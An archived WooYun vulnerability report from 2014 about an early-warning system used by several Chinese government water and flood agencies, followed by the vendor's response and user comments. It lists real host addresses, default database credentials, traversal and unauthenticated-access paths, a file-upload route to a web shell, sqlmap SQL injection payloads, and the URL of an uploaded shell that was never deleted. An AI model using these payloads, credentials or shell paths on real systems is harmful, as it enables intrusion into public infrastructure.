{"id": 1631, "wybug_id": "wooyun-2014-063623", "wybug_title": "某通用型预警系统存在一系列问题(文件遍历读取/弱口令/可发预警短信、无线信息/越权/Getshell/SQL注入/信息泄露)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "袋鼠妈妈", "wybug_date": "2014-06-05 09:27", "wybug_open_date": "2014-09-03 09:28", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "目录遍历", "任意文件上传", "敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向公众公开  简要描述： 某领域通用型预警系统存在一系列问题(文件遍历读取/弱口令/可发预警短信、无线信息/越权/Getshell/SQL注入/信息泄露) 详细说明：  =====================================软件技术支持：福建四创软件有限公司  网址： www.strongsoft.net 不少省份都有使用该软件，如:\nshzh.wlfx.gov.cn/ 218.86.6.48:3505/yj.yywater.gov.cn/222.216.218.28:8088/219.159.102.99:8088/218.86.96.98:3505/111.12.51.221:8088/ 222.242.107.62:4000/fxb.lucheng.gov.cn/183.233.205.85:9001/ 222.83.214.58:8088/180.130.175.138:3503/http://219.159.239.96:8088/\n刚开始以为只是目录遍历~~~~详细如下:1.目录遍历,配置文件可任意读取。 这个还是和网站的配置,但是绝大多数都是可以遍历,以http://219.159.102.99:8088/为例。遍历目录:/data//news//public//config//UploadFile//Report//log/……\n\n\n\n2.弱口令根据1.的目录遍历,看到/config/DataSetConfig%23.xml中<connection provider=\"System.Data.SqlClient\" string=\"Data Source=.;Initial Catalog=StrongMain;User ID=strong;password=strong;\">测试登录用户/密码:  strong/strong，登录成功.可实时查看各地水库、水闸、河网、海塘及气象预警信息\n\n3.可发短信及无线信息（这个也是短信吧?）,我测试时没有发送成功,直接点击发送时，发现参数userid、cusrtumno为空,但是接口应该是存在的，看到注释且该套程序配有SMSServer短信服务:\n\n\n\n\n\n4.不登陆可越权访问:/Warn/OuterWarnForMerger.aspx?hideBtn=30/Warn/OuterWarnForMerger.aspx?hideBtn=10……等页面\n\n\n\n5.上传shell（1）上传未做限制，\t基础信息查询-行政信息基本情况-预案管理（2）免登陆GetShell              通过抓包，直接在已知网址后面加上plan/FloodPlan/FloodPlanList.aspx?adcd=331081001003000&filetype=156&parentID=0，即可上传任意后缀文件，getshell\n\n\n\n\n\n\n\n6.其他信息泄漏:（1）信息管理-基础数据上报-基础数据导出：（2）部分网站存在视频服务器信息泄漏\n\n \n\n7.SQL注入:地址:http://shzh.wlfx.gov.cn/Plan/FloodPlan/FloodPlanList.aspx?readOnly=&adcd=331081001003000&filetype=156&r0.26239625721837556\n\n\n\n\nPlace: GETParameter: filetype    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: readOnly=&adcd=331081001003000&filetype=156' AND 5030=5030 AND 'bQhe'='bQhe&r0.26239625721837556    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: readOnly=&adcd=331081001003000&filetype=156' AND 9897=CONVERT(INT,(CHAR(58) CHAR(118) CHAR(99) CHAR(121) CHAR(58) (SELECT (CASE WHEN (9897=9897) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(117) CHAR(102) CHAR(116) CHAR(58))) AND 'bNIj'='bNIj&r0.26239625721837556    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: readOnly=&adcd=331081001003000&filetype=156'; WAITFOR DELAY '0:0:5'--&r0.26239625721837556    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: readOnly=&adcd=331081001003000&filetype=156' WAITFOR DELAY '0:0:5'--&r0.26239625721837556---web server operating system: Windows Vistaweb application technology: ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008available databases [14]:[*] AhadDataImage[*] AHADDATE[*] gq_center[*] gq_tmp[*] IStrongCMS_ZJWLFX[*] master[*] model[*] msdb[*] strongmain[*] StrongWater[*] tempdb[*] wenlingslj[*] wenlingSoftdb[*] wlfxbtest1\n   漏洞证明：  http://shzh.wlfx.gov.cn//UploadFile/Plan/20140604152732675.aspx （未删）\n\n   修复方案：     版权声明：转载请注明来源 袋鼠妈妈@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-06-09 23:04 厂商回复： CNVD确认并在多个政府网站实例上复现所述情况，已经由CNVD同步联系软件生产厂商福建四创公司，； 处置；同时根据测试实例，同步发浙江、广西等分中心处置案例。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-05 09:33 |    \t\tPythonPig \t\t\t( 普通白帽子  |\t\t\t        Rank:491 漏洞数:71        | 只会简单工具的小小菜)\t\t \n  袋鼠，你又淘气了    \n     2014-06-05 09:45 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  @PythonPig 擦，这么早？    \n     2014-06-05 09:57 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  太给力了吧哈哈大合集！    \n     2014-06-05 12:56 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  @wefgod 标题不长不给审核呀 o(∩_∩)o    @xsser @ xsser 求审核呀 http://wooyun.org/bugs/wooyun-2014-061873/trace/28a87f458a8adf887b9176cd1eb65eaahttp://wooyun.org/bugs/wooyun-2014-062615/trace/e1d2e832658750fe1d7c8057349c1058    \n     2014-06-05 13:04 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  你这是什么时候提交的，最近通用审核略慢    \n     2014-06-05 13:18 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n   @魇 22号提交的    \n     2014-06-05 15:26 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @魇 狗哥那啥去了。所以慢点    \n     2014-06-05 15:28 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  @wefgod 狗哥真结婚去拉？ 我以为社区说的是开玩笑的..    \n     2014-06-06 13:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @魇 真的。    \n     2014-08-05 22:24 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @袋鼠妈妈 为什么不删shell?    \n     2014-08-05 23:40 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  @U神  不会还能访问吧？做测试没删所以备注了未删，以为他们会删了，我下次注意啊，谢谢提醒呢    \n     2014-09-03 16:53 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  还没删    \n     2014-09-03 18:21 |    \t\tSeven.Sea \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:24        | 唯有安全与美食不可辜负。)\t\t \n  碉堡了QAQ    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}